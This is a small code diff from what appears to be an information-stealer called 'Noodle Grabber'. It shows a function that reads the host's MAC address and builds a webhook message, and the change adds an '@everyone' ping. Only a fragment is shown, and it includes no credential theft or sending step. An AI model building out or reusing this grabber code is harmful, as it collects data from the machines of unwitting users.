@@ -17,6 +17,7 @@ def get_inf(webhook):
     mac = addrs[0].address
 
     data = {
+        "content": "@everyone",
         "embeds": [
             {
                 "title": "Noodle Grabber",
